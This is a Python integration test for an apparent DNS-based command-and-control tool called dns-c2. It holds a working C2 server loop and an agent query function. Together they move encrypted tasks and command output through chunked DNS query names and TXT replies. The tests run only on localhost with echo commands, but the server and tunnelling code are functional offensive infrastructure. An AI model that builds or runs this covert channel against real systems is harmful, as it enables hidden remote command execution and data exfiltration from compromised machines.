#!/usr/bin/env python3
"""
Integration test for dns-c2.
Runs server in a thread, exercises the full encrypt→DNS→decrypt→execute round trip.
No separate processes needed.
"""
import os
import sys
import time
import socket
import threading

# --- env vars must be set BEFORE importing modules that read them at import time ---
import crypto  # crypto.py reads no env vars, safe to import first
KEY: bytes = crypto.generate_key()
os.environ["C2_KEY"] = KEY.hex()
os.environ["C2_SERVER"] = "127.0.0.1"
os.environ["SESSION_ID"] = "test001"

import dnslib
import dns.resolver
import queue_store

SESSION_ID = "test001"
SERVER_HOST = "127.0.0.1"
SERVER_PORT = 15353   # unprivileged port for testing
CHUNK = 62            # must match agent.py

PASS = "\033[32mPASS\033[0m"
FAIL = "\033[31mFAIL\033[0m"


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def run_server(max_queries: int = 4) -> None:
    """Minimal C2 server — mirrors server.py logic, handles max_queries then exits."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.settimeout(3.0)
    sock.bind((SERVER_HOST, SERVER_PORT))

    handled = 0
    while handled < max_queries:
        try:
            data, addr = sock.recvfrom(4096)
        except socket.timeout:
            break

        request = dnslib.DNSRecord.parse(data)
        qname = str(request.q.qname)   # "{count}.{chunk1}...{session}.c2.local."
        parts = qname.split(".")
        chunk_count = int(parts[0])
        hex_data = "".join(parts[1:1 + chunk_count])
        session_id = parts[1 + chunk_count]
        encrypted_data = bytes.fromhex(hex_data)

        message = crypto.decrypt(encrypted_data, KEY)

        if message != "READY" and queue_store.session_exists(session_id):
            last_task = queue_store.get_last_task(session_id) or ""
            queue_store.store_result(session_id, last_task, message)

        if not queue_store.session_exists(session_id):
            task = "WAIT"
        else:
            task = queue_store.get_next_task(session_id) or "WAIT"

        encrypted_task = crypto.encrypt(task, KEY)
        reply = request.reply()
        reply.add_answer(dnslib.RR(
            qname, dnslib.QTYPE.TXT,
            rdata=dnslib.TXT(encrypted_task.hex())
        ))
        sock.sendto(reply.pack(), addr)
        handled += 1

    sock.close()


def agent_query(payload: bytes) -> bytes:
    """Mirrors agent.py send_query (chunked protocol) using raw UDP + dnslib."""
    hex_payload = payload.hex()
    chunks = [hex_payload[i:i+CHUNK] for i in range(0, len(hex_payload), CHUNK)]
    qname = f"{len(chunks)}.{'.'.join(chunks)}.{SESSION_ID}.c2.local."
    query = dnslib.DNSRecord.question(qname, "TXT")

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(3.0)
    try:
        sock.sendto(query.pack(), (SERVER_HOST, SERVER_PORT))
        data, _ = sock.recvfrom(65535)
    finally:
        sock.close()

    response = dnslib.DNSRecord.parse(data)
    response_hex = str(response.rr[0].rdata).strip('"')
    return bytes.fromhex(response_hex)


def start_server_thread(max_queries: int = 4) -> threading.Thread:
    t = threading.Thread(target=run_server, args=(max_queries,), daemon=True)
    t.start()
    time.sleep(0.05)   # give socket time to bind
    return t


# ---------------------------------------------------------------------------
# Tests
# ---------------------------------------------------------------------------

def test_crypto_roundtrip() -> bool:
    label = "[1] Crypto roundtrip"
    try:
        for plaintext in ("READY", "WAIT", "echo hello world", "x" * 200):
            enc = crypto.encrypt(plaintext, KEY)
            dec = crypto.decrypt(enc, KEY)
            assert dec == plaintext, f"mismatch: {dec!r}"
        print(f"{label} ... {PASS}")
        return True
    except Exception as e:
        print(f"{label} ... {FAIL}: {e}")
        return False


def test_key_generation() -> bool:
    label = "[2] Key generation"
    try:
        k1 = crypto.generate_key()
        k2 = crypto.generate_key()
        assert len(k1) == 32, "key must be 32 bytes (AES-256)"
        assert k1 != k2, "two generated keys must differ"
        print(f"{label} ... {PASS}")
        return True
    except Exception as e:
        print(f"{label} ... {FAIL}: {e}")
        return False


def test_task_dispatch() -> bool:
    label = "[3] Task dispatch with real 'READY' heartbeat (server → agent)"
    t = start_server_thread(max_queries=1)
    try:
        queue_store.create_session(SESSION_ID, "test goal", "macOS", "ali", "localhost")
        queue_store.add_task(SESSION_ID, "echo hello_from_c2")

        encrypted_ping = crypto.encrypt("READY", KEY)
        encrypted_task = agent_query(encrypted_ping)
        task = crypto.decrypt(encrypted_task, KEY)

        assert task == "echo hello_from_c2", f"unexpected task: {task!r}"
        t.join(timeout=4)
        print(f"{label} ... {PASS}")
        return True
    except Exception as e:
        t.join(timeout=4)
        print(f"{label} ... {FAIL}: {e}")
        return False


def test_wait_on_empty_queue() -> bool:
    label = "[4] WAIT on empty queue"
    t = start_server_thread(max_queries=1)
    try:
        encrypted_ping = crypto.encrypt("READY", KEY)
        encrypted_response = agent_query(encrypted_ping)
        response = crypto.decrypt(encrypted_response, KEY)

        assert response == "WAIT", f"expected WAIT, got: {response!r}"
        t.join(timeout=4)
        print(f"{label} ... {PASS}")
        return True
    except Exception as e:
        t.join(timeout=4)
        print(f"{label} ... {FAIL}: {e}")
        return False


def test_chunking() -> bool:
    label = "[5b] Payload chunking — all labels ≤ 63 chars"
    try:
        for plaintext in ("READY", "x" * 100, "echo hello world && ls -la"):
            enc = crypto.encrypt(plaintext, KEY)
            hex_payload = enc.hex()
            chunks = [hex_payload[i:i+CHUNK] for i in range(0, len(hex_payload), CHUNK)]
            for chunk in chunks:
                assert len(chunk) <= 63, f"chunk too long: {len(chunk)} chars"
        print(f"{label} ... {PASS}")
        return True
    except Exception as e:
        print(f"{label} ... {FAIL}: {e}")
        return False


def test_result_routing() -> bool:
    label = "[5] Result routing (agent output stored in history)"
    # Needs 2 queries: heartbeat→task, then result report→stored
    t = start_server_thread(max_queries=2)
    try:
        # agent picks up the task queued from test 3 (queue is empty, session exists)
        # queue a fresh task so the session state is known
        queue_store.add_task(SESSION_ID, "echo result_test")

        # query 1: heartbeat → server dispatches "echo result_test"
        encrypted_ping = crypto.encrypt("READY", KEY)
        encrypted_task = agent_query(encrypted_ping)
        task = crypto.decrypt(encrypted_task, KEY)
        assert task == "echo result_test", f"unexpected task: {task!r}"

        # query 2: agent sends back the output
        simulated_output = "result_test\n"
        encrypted_output = crypto.encrypt(simulated_output, KEY)
        agent_query(encrypted_output)   # response is WAIT, we don't care

        t.join(timeout=4)

        history = queue_store.get_history(SESSION_ID)
        assert len(history) >= 1, "no results stored"
        last = history[-1]
        assert last["command"] == "echo result_test", f"wrong command: {last['command']!r}"
        assert last["output"] == simulated_output, f"wrong output: {last['output']!r}"
        print(f"{label} ... {PASS}")
        return True
    except Exception as e:
        t.join(timeout=4)
        print(f"{label} ... {FAIL}: {e}")
        return False


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    # clean slate — remove any leftover file-backed state from previous runs
    if os.path.exists("sessions.json"):
        os.remove("sessions.json")

    print("=== dns-c2 integration tests ===\n")
    results = [
        test_crypto_roundtrip(),
        test_key_generation(),
        test_task_dispatch(),
        test_wait_on_empty_queue(),
        test_result_routing(),
        test_chunking(),
    ]
    total = len(results)
    passed = sum(results)
    print(f"\n{passed}/{total} passed")
    sys.exit(0 if passed == total else 1)
